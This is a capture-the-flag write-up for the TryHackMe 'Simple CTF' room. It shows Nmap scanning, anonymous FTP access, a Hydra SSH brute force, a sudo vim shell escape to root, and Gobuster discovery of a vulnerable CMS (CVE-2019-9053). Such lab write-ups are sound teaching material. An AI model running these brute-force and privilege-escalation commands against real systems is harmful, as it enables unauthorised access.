# Simple CTF Writeup (TryHackMe)

## Challenge Overview

Simple CTF is a beginner-friendly room focused on basic enumeration, brute-forcing, and privilege escalation. It involves working with FTP, SSH, web directories, and exploiting misconfigurations like sudo privileges.

---

## Initial Enumeration

Ran an Nmap scan to identify open services:

```bash
sudo nmap <target-ip> -sS -T4 -A -oN init_scan
```

![2025-05-07_18-01](https://github.com/user-attachments/assets/249132e9-6b7f-4303-bc0d-592a8ec2bd78)

**Discovered Ports:**

* 21 (FTP)
* 80 (HTTP)
* 2222 (SSH)

---

## FTP Access

Attempted anonymous login to FTP:

```bash
ftp <target-ip>
```

![2025-05-07_18-12](https://github.com/user-attachments/assets/4555aed6-5920-413c-965f-5af762475c2d)

Retrieved `ForMitch.txt` which hinted that the user `mitch` had a weak password.

![2025-05-07_18-17](https://github.com/user-attachments/assets/65949bbc-4005-4ebe-a87c-fa58acf12892)

---

## SSH Brute Force

Used Hydra to brute-force SSH credentials:

```bash
hydra -l mitch -P /usr/share/wordlists/rockyou.txt -s 2222 <target-ip> ssh
```

![2025-05-07_18-21](https://github.com/user-attachments/assets/0e11d534-66da-4edb-8394-8bfb0d29fa7e)

**Credentials Found:**

* Username: `mitch`
* Password: `secret`

Logged into the system:

```bash
ssh -p 2222 mitch@<target-ip>
```

![2025-05-07_18-22](https://github.com/user-attachments/assets/be323de4-a303-43a6-abd2-65089b6baa7c)

---

## User Flag

Located `user.txt` under Mitch's home directory:

```bash
cat user.txt
```

![2025-05-07_18-24](https://github.com/user-attachments/assets/ea6cb32e-e514-4254-806d-5071493b7e2a)

First flag obtained.

---

## Privilege Escalation

Performed manual enumeration:

* Discovered user `sunbath` but no immediate lateral movement.
* Found that `vim` could be run as root with sudo:

```bash
sudo -l
```

![2025-05-07_18-30](https://github.com/user-attachments/assets/0a2be8cf-0cd8-4382-826f-eaa91391e084)
![2025-05-07_18-46](https://github.com/user-attachments/assets/d59cbcf2-190c-44fb-9c94-281ebfbc1ca9)

**Exploit using GTFOBins (vim + sudo):**

![2025-05-07_19-53](https://github.com/user-attachments/assets/9f42c087-9c5e-4b1e-a2ae-b7e337719268)

```bash
sudo vim -c ':!/bin/sh'
```

![2025-05-07_18-47](https://github.com/user-attachments/assets/a0c69728-81ea-44b8-b69e-c1d0d0f62dc6)

Got root shell.

Located the root flag:

```bash
find / -type f -name root.txt 2>/dev/null
cat /root/root.txt
```

![2025-05-07_18-47_1](https://github.com/user-attachments/assets/8f1adc45-57b3-4c91-b7fa-348df5d6271e)

Root flag obtained.

---

## Web Enumeration

Ran Gobuster to enumerate web directories:

```bash
gobuster dir -u http://<target-ip>/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -q
```

![2025-05-07_18-49_1](https://github.com/user-attachments/assets/616fb2f9-cb68-4d8c-80c8-57352bf234ba)
![2025-05-07_18-49](https://github.com/user-attachments/assets/43dc1a40-f0b4-4bc2-ad7a-af70e89b9c7a)

Discovered:

* `/simple` directory

Visited `http://<target-ip>/simple` and identified the CMS:

* **CMS Made Simple v2.2.8**

![2025-05-07_18-50](https://github.com/user-attachments/assets/efea4421-d460-407f-a26a-edb38be87f07)
![2025-05-07_18-51](https://github.com/user-attachments/assets/ebf646a8-0a60-4200-9f37-a2cbdff374ff)

Searched for known vulnerabilities. The question hint led to the **CVE for the News Module SQL injection vulnerability**:

![2025-05-07_18-53_2](https://github.com/user-attachments/assets/36f75bf9-6e88-4460-a1f2-90a4dcf723ec)
![2025-05-07_18-53](https://github.com/user-attachments/assets/3bf0495d-6924-46b5-8844-a1bc4173bbdc)

* **CVE-2019-9053**
* **SQLi**

---

## Conclusion

![2025-05-07_18-53_1](https://github.com/user-attachments/assets/a08acf4c-6985-4dbf-8254-61fe218c0e84)

This room tested core concepts:

* Anonymous FTP enumeration
* SSH brute-force using Hydra
* Web directory scanning and CMS identification
* Privilege escalation with Vim using GTFOBins

Simple CTF demonstrates how small misconfigurations and weak credentials can lead to full system compromise.
